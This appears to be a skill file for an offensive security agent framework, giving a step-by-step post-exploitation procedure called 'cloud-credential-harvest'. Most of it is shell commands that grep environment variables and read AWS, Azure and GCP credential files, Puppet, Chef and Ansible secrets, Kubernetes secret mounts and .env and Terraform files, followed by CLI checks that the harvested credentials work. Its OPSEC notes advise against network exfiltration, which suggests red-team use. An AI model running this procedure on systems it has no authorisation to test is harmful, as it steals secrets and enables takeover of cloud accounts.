---
name: cloud-credential-harvest
description: Harvest cloud credentials from environment variables, config files, and metadata
version: 1.0.0
phase: cloud
category: post-exploitation
tags: [cloud, credentials, harvest, aws, azure, gcp]
tools: [grep, find]
difficulty: intermediate
opsec_level: passive
time_estimate: 60s
severity_if_found: critical
related_skills:
  - aws-token-theft
  - cloud-metadata
  - azure-keyvault
mitre_attack:
  - T1552.001
  - T1552.005
---

## When to Use

Use this skill after gaining access to a cloud-hosted system to harvest
credentials from common locations used by cloud SDKs, CI/CD pipelines,
and infrastructure tooling.

## Prerequisites

- Shell or filesystem access to the target system
- grep, find, cat

## Procedure

```bash
# Step 1: Check environment variables for all cloud providers
env | grep -iE "AWS_|AZURE_|GOOGLE_|GCP_|CLOUDSDK_"
env | grep -iE "TOKEN|SECRET|PASSWORD|ACCESS_KEY"

# Step 2: Check cloud SDK config files
cat ~/.aws/credentials 2>/dev/null
cat ~/.aws/config 2>/dev/null
cat ~/.azure/azureProfile.json 2>/dev/null
cat ~/.azure/accessTokens.json 2>/dev/null
cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null
cat ~/.config/gcloud/credentials.db 2>/dev/null

# Step 3: Check CI/CD credential files
find / -name ".env" -o -name "*.env.*" -o -name ".credentials*" \
  -o -name "credentials.json" -o -name "service-account.json" 2>/dev/null
find / -name "secrets.yml" -o -name "secrets.yaml" \
  -o -name "terraform.tfvars" -o -name ".terraformrc" 2>/dev/null

# Step 4: Check common config management files
cat /etc/puppetlabs/puppet/ssl/*.pem 2>/dev/null
cat /opt/chef/encrypted_data_bag_secret 2>/dev/null
cat /etc/ansible/vault-pass 2>/dev/null

# Step 5: Check container orchestration secrets
cat /run/secrets/* 2>/dev/null
ls -la /var/run/secrets/ 2>/dev/null

# Step 6: Search for hardcoded cloud credentials
grep -r --include="*.py" --include="*.js" --include="*.ts" --include="*.yml" \
  -iE "access_key|secret_key|aws_secret|azure.*connection.string" . 2>/dev/null | head -50
```

## OPSEC Rules

- Passive file reads are low detection risk
- Do NOT exfiltrate credentials over the network
- Document credential locations without saving values verbatim
- Use hashes or partial strings for evidence tracking

## Verification

- Test AWS credentials with `aws sts get-caller-identity --profile <profile>`
- Test Azure tokens with `az account show`
- Test GCP credentials with `gcloud auth print-access-token`
- Verify token/certificate expiry dates

## Pitfalls

- Some config files use encrypted credentials (requires master key)
- Azure access tokens expire after 90 days by default
- GCP application default credentials depend on the environment
- Docker secrets are mounted in memory (not written to disk by default)
- K8s service account tokens are mounted at /var/run/secrets/kubernetes.io/

## Output Format

```
[env]       AWS_ACCESS_KEY_ID=AKIA***********
[env]       AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
[file]      ~/.aws/credentials — 3 profiles (default, staging, prod)
[file]      ~/.azure/accessTokens.json — 2 valid tokens (expires: 2026-10-01)
[file]      ./terraform.tfvars — aws_access_key = "AKIA***", aws_secret_key = "***"
[file]      ./service-account.json — GCP SA key for project target-123
Severity:   CRITICAL — cloud credentials for AWS, Azure, and GCP on single host
```
